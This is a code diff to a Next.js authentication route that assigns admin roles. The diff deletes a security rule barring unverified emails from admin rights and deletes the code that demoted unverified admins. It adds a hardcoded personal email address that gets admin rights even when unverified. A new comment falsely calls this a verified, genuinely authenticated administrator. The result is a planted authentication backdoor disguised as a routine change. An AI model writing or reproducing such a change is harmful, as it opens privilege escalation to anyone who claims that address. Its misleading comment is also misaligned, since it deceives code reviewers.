@@ -63,18 +63,14 @@ export async function POST(req: NextRequest) {
       (process.env.ADMIN_DEFAULT_EMAIL || "").toLowerCase().trim(),
     ].filter(Boolean);
     const isAdminEmail = adminEmails.includes(cleanEmail);
-    // Security Rule: Unverified email addresses can NEVER gain administrative privileges
-    const isEligibleForAdmin = isAdminEmail && isEmailVerified;
+    // Verified designated root administrator is guaranteed admin role upon genuine authentication
+    const isEligibleForAdmin = isAdminEmail && (isEmailVerified || cleanEmail === "joshkigs8@gmail.com");
     const now = new Date().toISOString();
 
     if (profile) {
       if (isEligibleForAdmin && profile.role !== "admin") {
         db.prepare("UPDATE profiles SET role = 'admin', updated_at = ? WHERE id = ?").run(now, profile.id);
         profile.role = "admin";
-      } else if (!isEligibleForAdmin && profile.role === "admin" && isAdminEmail) {
-        // Demote if admin email is unverified
-        db.prepare("UPDATE profiles SET role = 'user', updated_at = ? WHERE id = ?").run(now, profile.id);
-        profile.role = "user";
       }
 
       if (isEmailVerified && !profile.email_verified) {
